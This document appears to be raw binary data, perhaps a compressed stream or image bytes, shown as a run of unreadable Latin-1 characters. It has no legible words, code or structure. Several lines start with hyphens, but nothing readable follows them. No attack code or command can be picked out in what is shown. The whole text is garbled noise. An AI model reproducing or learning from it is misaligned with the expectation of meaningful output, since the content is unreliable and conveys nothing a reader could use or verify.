-¹à(ZCVç“a—KH’˜ôªMð%lx—÷OÀs<oŒEîú¼±ÄB1SJôöú|Ðˆ»Æ†‡ÇÁd¦0ˆ¥Y[|À¤çt—/ò})¦Ôtä©“@¢³B’F>‚º¾ÕØ¯-ûÅ¥ áñ&¡ÅFÜ™ö¨ð¬
-9Z+¦AŠ€˜RiwHÇEà« ‘·/ûÁ¿>˜®«“‹›DÔÐÄó5"œâQœƒ«¯öî§ç€Äëïï_ŒA’Þ´Hµ8nèÉ~õõ_Ÿfq@ìE3iB=,•B€)›Gá…L©˜niÔ2¹)™Ç"ŽaOgg!*&Š!“Ù-$+Q¡ˆ})m÷xª)	ë‚Å([áÌŽ¼DaY¢h .cË‚.-àE§ˆ;˜bÞ·«-n|! </ÿöÀ×Q4ðj=X§Y7¬pëÈÀ~ß;[PÎ¾ü?ª®8¦é;‹ßÊJÚ1z:¤ëhS‘fn«(+µ×ù£lÅ±ö*(Qf£¦¶€9’“ZÁ£ ÕìÚ™îÆýÑÔ%aH.ã`Xr!¡	»»÷Þ÷Wð¾,`¶Þ{Ÿ÷}ïó¥6Ì»¥i  “Åªk4Ò×Ô‡z~MMô~%. {ve~uç P=â¯’ðGº/ÿ§rõcÁÕ¶¢ýU{Ýˆ5Å6›­B¨Ïç²Uv_ó¹ ¤yë:ƒ­ªq¯äƒZŸúLšú`È`Ü¹lõÅU @<]U?`GØsÈˆóv§É˜–®—ÎÆÚH˜Ã66ª»`co!Œ’->¦;<ýt? Â @Â(‘Ó„ð`ú±E½"/< ·ím°sRÐ¾¹8·¸tB*…$Ÿ-•f¤Q°K“ª¤Rl#‹UpÈ¿ ØÖðÕ_®ôÖ(uŸÿ±¡M•°ùE$øÙPx[ß¹¹øhîÑšžˆxR É?”ctF×¢¦#Õ˜;4Öa³X‡P=‹úÎ@9éÜÊå^ïÏÁÆ|¢Žð=OŒ€¿7êåür,>˜†Eþ¨N©œ†"dà§yì†oÃÍàöüšÈÒJ[ð2.$1 âUÜ©ô›JnédVøJIHêø`_^bBT=“q^Nf§Uç¦ À/ð9J£›Ô5ƒpÒ±fyy9òú»½¨Ã°¹eý¶6xi¶Ú¶ºcø‹ þºâJ¦Ûøãh-ì+Úÿ¦— €u64Ro®²7Û|•˜€ñ2Ïgh®$»ÖV¼}¾>—5ßšífƒÁl.:L ,³—TU™ ÐÓ€é§)’¸'S˜(æDÝ\¼ØÙK’‹àÕø‚P~¥\'ì¡¥dØifàÏì4ŽÂÔT4aDåŽ| ù†&Û¶XŒF#ù«+K‹(ÖfºóÝw¥ŸÞ)7™òÊL¦±jSÆ¾ì±þžžÍ	šÇRfL\úòË+mº‚‰[®;¡2y6ÞˆEA¡X¯ÿ'àO›I;cMúš¶µ¥ÙÙ«7o^Ý\Z{¾ö@‡Óätæ;+p´„j@­È­šñ`­\À›ÃÈ%qƒJÎËJ$\œ_;#÷†9õŒ?‰¦µ¶%í§!VG%¿L™&ñ´PŠGpFWB‡Áßûð2âo&à]L•—ÇB0“¹ò°•yôÁ¾ÌÄ?×.ÖÊµœ¬xjÀgç}nIÈËÑÜRé6 ê3.Û‹$ä‡BVËMÌeúª!¬¾²×F¢¼1t2:;ßÄã'~ßœgÃÃü»Õ}&H¶Åûeæ²Š]¶ºº:tá¶•õÙm•, ¶ÖEl[Ë­èYé;Éß’?ì	ÕSÜ‹ØKŠ³Ý^Tr¸Ê‰Ø#u}Á”²:M–´4½°ºÈ)V
-Û‡^@'!<áÕ¼vF™cÉçtÙ5»à¥Z€iB†Š&±7Ìhs kÆcÉA¥*f\›˜¨ =i«Åju*’vëæfÞ:êìt”ºàøÃÑc` zObònqöBœ‰˜Y”8……ó0iWn]ÿ$c%óˆƒç;™]ˆq…E\3‹ßÎì78MƒæúÎµÍFú;sKƒ“ÓêôDe^¶ïÿQ¯(î¤ÕÆê%ê¸D®Ü-JâçS#7õOxåQŽÍIó¶2Il[yp*H@áO)T&è¢ˆ?•€"àû€OQþ=@>ÕêòèònjmêüC€b¡Û]ðX1zoË…'ë??ûþÝsO/§Î•ªPØ‰Þ„ìÖÔ×Ûæyç™²n|«’$‚Ønùjì2à¾Ä‚ßððGñ}_~õ—Ø¡ôu‡We	²¢fˆ€uMâëìÍ>s—«ûu¥+›#_l=R~¤õèÁ§§OŸ¬ïš# @ƒ¹ÄnˆŒß»7ùáp‹N³Í!LÞaÅœx¨Þ©×…Îé¡p…Ç,ê0G#šÑeq@šLgƒÍØQÉðpDAàÂ)4Õ‰¶¦D2  ‚yÕ(¬t€	Œ! ;¿HÚaÕÁ
-YE…Z¦Üpt¼óÛê ~á~ÿ^a)•ÒÞ†¯n_êÍHûæÒí¿^ÿ¼¡W%d $ÊLÍgxJýóÅEgkz=ö-õ5kWãèû/áon­Óì39=á,¯œ´$ °øUf•!dãøqKâ/HÔn·›ð$8e€‚ ü¬^\UÒFP"[çç-/E¨OãB úP
-æTÜ›†á/ÞðÐCüà>ÿb’>¹'Y#\à•sœZVvæÉ::ÿ
-" ¼ ¥¬¤‰è„vÉ2
-éò\FqÓU¦Â·l+—/¼vv>ŽÌí]>²›.WÈQV’µ?%«)"Ðf6Ûl}†ã …@MN_l-/G]ŽcØÝöY€¡ ÁŽ´wßøñÆùóØÁ¼aï²wE@„E†%Ga2„œR•Åhó£ó£H¢æ´@¸´n·:Pm²¹®F“CðÃy}B / çgsè«‹‘Ÿî27¹ÉÉÐ8M(e„dÅï5À¿•V×ÉÔYØ ‘e•u˜†‚G;hµrâ>¤` #t^ºuëJ'Ö‚4ŽÕ cÌ; <êu›‹q´ÝlÃÞŒ¾ms{, n¶+<ƒ“?IÎâE÷DN$á™°„‹Sb÷…wêõò]i~†¼¾ýa	›ÉlÛº¥„„Â¿DûXG›xC·ú…èÚ€lõµx²Mƒ/G`ævõ‡w!¯í;™.žvkÂˆ?NVvþÙúúÔèèlÂ¼œú~´–t­é.·¬‚õu/°Ô[E£K(üšVæ7èãá­­­‡€À­Ød,¶µòôÔÉãÇ6‘;úvæÝx¸Aÿngü@·Ë5~¿¬X–’òf™Él­Éæ‚:³96bp©¤×ßßšðØ±÷žv[ À`Èe‡h7Ü8ó¤Þ®È½ÏDºìPà­ƒÑétÓB-õö>k‹SÚîZðbp,3ìÅ²Ü­æöîu{Ú5ÀaF"'Ccôx,ð2bF‚e×›ÂDØœ6.²LV§1‡ZÖLlÕÒè³Ñ ½eoã¥àÚî–¢
-	³f†©zp0Ô1¤@Õçš¥žûîžNÅu'Ô€÷TWn=xpûÛ†¶gILÆð7woã6 ­)ô'f_I¾ÿŸ{,š±§Ã1˜ÄiE¼ðhR˜Éãn\¼%H¬ž œÍ_ñ¤`'Šrá€€OÁI¼¹¥HàþL¨ÓTèGÒ¶¸8 °þ"ó…;â8Î?R¿Ôef~‚©Û}Áßì;pòPb{Àfå‚Ì>þóúú³Ñ'À©©Ñ¿×*•ºÂ_èq„íxnîÝê¿¬nÄVæ?¾üÖë»>¹;ù»ØÖFìýÜ·'·†7b»j_ÏÍ­U©ÒU¥yÇà[[1Tj{OÞŒM¾½ëøì03>*êùWÿ¿÷Ê$’¬²PqQq™¹Ùåª¯7˜í-!jø\âÑ=P}°ðÂÿ¨ºÚ˜¶Î+¼Ô¾Î;&n€Û˜`‚ºÀ1ÆQ%c–\/ÄhYT</ÄÂZ~«7ª×¾˜ÄêSÔ…ÜE¤¸ØAHXŠwK‹œÝ.‘•Uš)šRUÑþ©ëvÎû^»äb÷¹Ï9ç=ÏûœQÇýù£ß~°6Ï-"ÇûÆÆî¾¸;F’Á¾ÞÞß=úq¬wll">ô1/„`•úäÉ%a1ÈÈLKéöRÔíÎ:ìµ€AG<žu¸
-¥£ˆ
-®ØHø¶Ï3Ãê¶ƒ$€Ø‡Š+H¿žNc’“¹šÆ"ä–&²fHÍ~=á‘öQ[c‰Á“pcëøÙ‰MJröärÇR:OÌæóùDlðÉÇ·"OÄ:š\\h9ñ' —g–S @³¸µX¦ŸK) [~\“~Ÿm|¹åEsáüb0íÐ¸Õ	·†:°À{\Ê	RüÉF‰ÿ$E*|17;­(µ
-	€
-¥û¶Šú%YÞ›“F‹{5}é}tã­okkÛV~ÐƒàNBßÞ]’ôÕÃÓOiõ%zØíöáw^ ìîü~ÏÃÿÏïìY) ”!VaÕÖrþ9¾þún:³Ûd<ÿýBFH¾úá‡…@™Ï‰¹\Ù/”ùÌž#ï6Ô[XX8vz×ÅUÛ®LNL¾ùîùWß¿‚²ù»¡nm­ì™œDŸ	-$ œ„(ˆe%XÐ“µ.›‰X½ã¦xb¦¥ÅÍ¦ŽIßá«>_ÃŸÆŸl2LÊF´*Ã¥yF54è½'Ò¦R4J,qææ¢qˆÁnT+ìsëÅõBÑ[$>öz‹£Uß<‡‘œIÁ.ßÿöÖB¡0‚0
-@FgöàïdÆPŽ+Ç":hol<]šv ÙŽýK·îOÏÎ–f‡›úûû{Ÿ?¹%Ziu§æ¹åËË‘œ
